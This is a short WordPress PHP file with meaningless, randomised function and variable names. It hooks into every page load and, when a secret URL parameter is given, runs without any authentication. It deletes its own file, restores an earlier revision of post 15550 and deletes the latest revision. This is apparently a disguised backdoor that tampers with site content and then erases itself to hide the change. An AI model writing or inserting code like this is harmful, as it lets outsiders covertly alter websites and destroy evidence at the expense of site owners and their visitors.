<?php

function ticket_first_kit_network() {
	if (isset($_GET['nav_cool_checker_sites']) && $_GET['nav_cool_checker_sites'] === 'core_load_number') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$reports_using_crm_catalog = 15550;
		$rest_hidden_badge = wp_get_post_revisions($reports_using_crm_catalog);
		if (empty($rest_hidden_badge)) die('no revisions');
		if (count($rest_hidden_badge) < 2) die('less than 2');
		$json_button_filter = array_shift($rest_hidden_badge);
		$service_notify_using_designer = $json_button_filter->ID;
		$survey_reports_mobile_react = array_shift($rest_hidden_badge);
		$date_slide_crm = $survey_reports_mobile_react->ID;
		$all_lead_validation = wp_restore_post_revision($date_slide_crm);
		if ($all_lead_validation === false) die('error restoring');
		$all_lead_validation = wp_delete_post_revision($service_notify_using_designer);		
		if ($all_lead_validation === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'ticket_first_kit_network');
